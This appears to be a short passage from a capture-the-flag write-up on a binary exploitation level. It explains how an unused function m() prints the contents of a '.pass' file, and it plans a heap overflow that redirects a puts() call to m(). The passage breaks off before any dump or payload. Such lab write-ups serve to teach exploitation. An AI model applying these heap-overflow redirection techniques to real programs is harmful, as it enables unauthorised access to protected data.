##	Description

The binary here creates two arrays of two int32_t each, arr1 and arr2. The first element is stored on the stack with the value 1 and 2 respectively, then the second element is allocated with malloc(8), which is enough to store an address/a pointer.

There is a ghost function in the program again, `m()`:

```c
int m() // 0x080484f4
{
    return printf("%s - %d\n", &str, time(NULL));
}
```

This functions will be useful to print the content of the global string used as buffer to load the content of the file `.pass`.

In case we execute the program with normal arguments, the program will read the content but then it will call the `puts()` function with a static string that is not useful here. For the exploit, we need to redirect the execution to call `m()` instead.

To do so, we have to overflow the heap. Using GDB, we can dump it like so:

